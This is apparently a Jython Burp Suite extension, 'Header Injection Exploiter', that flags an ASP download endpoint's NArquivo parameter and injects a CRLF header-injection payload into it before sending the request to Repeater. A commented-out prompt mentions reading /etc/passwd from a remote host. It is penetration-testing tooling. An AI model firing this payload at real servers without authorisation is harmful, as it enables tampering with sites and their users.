from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from burp import IHttpListener
from burp import IContextMenuFactory
from burp import IParameter
from javax.swing import JMenuItem
from javax.swing import JOptionPane
from javax.swing import JFrame
from java.util import List, ArrayList

PAYLOAD = "aaa%0d%0aHeader:+Injection%0d%0aHueHue:+HueHue%0d%0a"


ISSUE = "ASP Header Injection"
SEVERITY = "High"
ISSUE_DETAIL = "This vulnerability allows an attacker to "\
               "exploit Header Injectiono on remote host."

PUBLISH_ISSUE = "CustomScanIssue(currentMessage.getHttpService()"\
                ",self._helpers.analyzeRequest(currentMessage)"\
                ".getUrl(),[self._callbacks.applyMarkers"\
                "(currentMessage, None, None)]"\
                ",\"{0}\",\"{1}\",\"{2}\")".format(ISSUE,
                                                   ISSUE_DETAIL,
                                                   SEVERITY)


class BurpExtender(IBurpExtender, IHttpListener,
                   IScannerCheck, IContextMenuFactory,
                   IParameter):

    def banner(self):
        print "Successfully loaded Header Injection - v0.1"

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self.context = None
        self._callbacks.setExtensionName("Header Injection Exploiter")
        callbacks.registerHttpListener(self)
        callbacks.registerScannerCheck(self)
        callbacks.registerContextMenuFactory(self)
        self.banner()

    def createMenuItems(self, context_menu):
        self.context = context_menu
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Send to Header Injection Exploiter",
                                actionPerformed=self.setPayload))
        return menu_list

    def setPayload(self, event):
        proto = 0
        httpRequestResponse = self.context.getSelectedMessages()
        for currentRequest in httpRequestResponse:
            #parentFrame = JFrame()
            #cmd = JOptionPane.showInputDialog(parentFrame,
            #                                  "File path to read from remote host. Ex:/etc/passwd")
            headers = list(self._helpers.analyzeRequest(currentRequest).
                           getHeaders())
            newMessage = self._helpers.buildHttpMessage(headers, None)
            if currentRequest.getHttpService().getProtocol() == 'https':
                proto = 1
            hp = str(self._helpers.analyzeRequest(
                currentRequest.getRequest()).getHeaders())
            for p in self._helpers.analyzeRequest(currentRequest.getRequest()).getParameters():
                if p.getName() in hp:
                    if 'NArquivo' in p.getName():
                        newParam = self._helpers.buildParameter(p.getName(),PAYLOAD,
                                                                IParameter.PARAM_URL)
                        newMessage = self._helpers.updateParameter(newMessage, newParam)
                    else:
                        newParam = self._helpers.buildParameter(p.getName(),p.getValue(),
                                                                IParameter.PARAM_URL)
                        newMessage = self._helpers.updateParameter(newMessage, newParam)
            
            self._callbacks.sendToRepeater(currentRequest.getHttpService().getHost(),
                                           currentRequest.getHttpService().getPort(),
                                           proto, newMessage, None)

    def processHttpMessage(self, toolFlag, messageIsRequest, currentMessage):
        if not messageIsRequest:
            return

        if toolFlag == 8:
            if self.validate_file_extensions(currentMessage):
                issue = eval(PUBLISH_ISSUE)
                self._callbacks.addScanIssue(issue)

    def doPassiveScan(self, currentMessage):
        if self.validate_file_extensions(currentMessage):
            return [eval(PUBLISH_ISSUE)]

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        if (existingIssue.getIssueName() == newIssue.getIssueName()):
            return -1
        else:
            return 0

    def validate_file_extensions(self, currentMessage):
        url = str(self._helpers.analyzeRequest(currentMessage).getUrl())
        if 'default_download.asp?NArquivo' in url.split('/')[-1]:
            return 1
        return 0


class CustomScanIssue(IScanIssue):

    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail + '<br/><br/><div style="font-size:8px">'\
                                'This issue was reported by Header '\
                                'Injection Extension</div>'
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
